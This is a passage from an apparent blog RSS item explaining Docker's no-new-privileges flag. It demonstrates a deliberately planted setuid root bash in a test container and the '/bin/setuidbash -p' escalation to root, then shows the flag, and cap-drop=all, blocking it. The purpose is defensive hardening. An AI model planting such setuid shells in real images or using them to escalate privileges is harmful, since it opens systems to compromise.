RUN useradd -ms /bin/bash newuser

USER newuser

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ve got another bash shell which we’ve made setuid root, meaning that it can be used to get root level privileges (albeit still constrained by Docker’s default capability set).&lt;/p&gt;

&lt;p&gt;If we build this Dockerfile as &lt;code class=&quot;highlighter-rouge&quot;&gt;nonewpriv&lt;/code&gt; then run&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we get landed into a bash shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; at this point will make us root demonstrating that we’ve effectively escalated our privileges inside the container.&lt;/p&gt;

&lt;p&gt;Now if we try launching the same container, but add the no-new-privileges flag&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --security-opt=no-new-privileges:true nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; our escalation to root doesn’t work and our new bash shell stays running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user, foiling our privilege escalation attempt :)&lt;/p&gt;

&lt;p&gt;So, this option is one worth considering if you’ve got containers being launched as a non-root user and you want to reduce the risk of malicious processes in the container trying to get additional rights.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Edit&lt;/strong&gt; Just to add based on conversations on twitter following this post, it’s worth noting that you can achieve the same effect as &lt;code class=&quot;highlighter-rouge&quot;&gt;no-new-privileges&lt;/code&gt;, if you want to run your container as a non-root user, by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;cap-drop=all&lt;/code&gt; as part of the run statement.  This has a similar effect in stopping the contained processes from gaining any Linux capabilities, and if your workloads support it, is a great idea for hardening your containers.&lt;/p&gt;
</description>
				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/06/01/docker-capabilities-and-no-new-privs/</link>
				<guid isPermaLink="true">/blog/2019/06/01/docker-capabilities-and-no-new-privs/</guid>
			</item>
		
	</channel>
</rss>
